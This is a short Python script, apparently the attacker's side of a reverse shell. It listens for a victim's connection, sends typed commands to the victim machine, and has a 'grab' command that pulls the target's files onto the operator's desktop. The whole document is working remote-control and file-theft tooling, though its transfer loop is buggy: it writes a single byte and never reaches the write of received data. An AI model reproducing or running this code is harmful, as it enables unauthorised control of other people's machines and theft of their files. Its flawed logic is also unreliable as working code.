import os
import socket
def transfer(conn,command): #function (connecting) grab part
	conn.send(command.encode())
	grab,path=command.split('=')
	f=open("/root/Desktop/"+path,"wb")  #path  assigned  to our system for grabing targets file
	while True:
		bits=conn.recv(1024)
		if bits.endswith ("END".encode()):
			f.write(bits[-3])
			f.close()
			print("[+] transfer completed")
			break
			f.write(bits)
def connecting():
	ip=input("enter the ip:")# your ip
	port=int(input("enter the port:")) #port eg 8080
	s=socket.socket()
	s.bind((ip,port))
	s.listen(1)
	print("[+] listening for incoming connections")
	conn,addr=s.accept()
	print("[+] connection established",addr)
	while True:
		command=input("shell>>")
		if 'terminate' in command:
			conn.send('terminate'.encode())
			break
		elif 'grab' in command:
			transfer(conn,command)
		else:
			conn.send(command.encode())
			print(conn.recv(1024))
def main():
	connecting()
main()




		